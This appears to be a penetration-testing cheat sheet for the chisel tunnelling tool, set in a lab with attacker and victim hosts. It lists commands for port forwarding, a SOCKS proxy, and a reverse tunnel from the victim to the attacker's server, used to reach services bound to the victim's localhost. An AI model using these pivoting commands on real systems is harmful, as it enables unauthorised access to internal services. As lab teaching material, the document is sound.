Tool for proxying ports, socks, etc. [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel).

# Lab descr:

* Attacker - 192.168.1.1. Have 127.0.0.1:9080 port open.
* Victim - 192.168.1.2. Have 127.0.0.1:8080 port open.

# Just Proxy

Server on victim, client on attacker.

## port2port

Port on attacker forwards to port on victim

```
chisel server --host [LOCAL_IP] --port [SERVER_PORT] --auth test:test
chisel client --auth test:test [SERVER_IP]:[SERVER_PORT] 127.0.0.1:[LOCAL_PROXY_PORT]:127.0.0.1:[TARGET_PORT]
```

```
### victim
chisel server --host 192.168.1.2 --port 10777 --auth test:test

### attacker
chisel client --auth test:test 192.168.1.2:10777 127.0.0.1:18080:127.0.0.1:8080

### Direct connect from attacker, no socks proxy needed
curl http://127.0.0.1:18080
```

## port2any_local

```
### victim
chisel server --host 192.168.1.2 --port 10777 --auth test:test --socks5

### attacker
chisel client --auth test:test 192.168.1.2:10777 127.0.0.1:18080:socks

### Request from attacker to service on victim localhost
curl --proxy socks5://127.0.0.1:18080 http://127.0.0.1:[ANY]
curl --proxy socks5://127.0.0.1:18080 http://127.0.0.1:9080
```

# Reverse

A bit insecure. If you run server on your machine, anybody can connect to it and proxy to your host/localhost.

```
### attacker
chisel server --host 192.168.1.1 --port 10777 --auth test:test --socks5 --reverse

### victim
chisel client --auth test:test 192.168.1.1:10777 R:18080:socks

### Request from attacker to service on victim localhost
curl --proxy socks5://127.0.0.1:18080 http://127.0.0.1:[ANY]
curl --proxy socks5://127.0.0.1:18080 http://127.0.0.1:8080
```
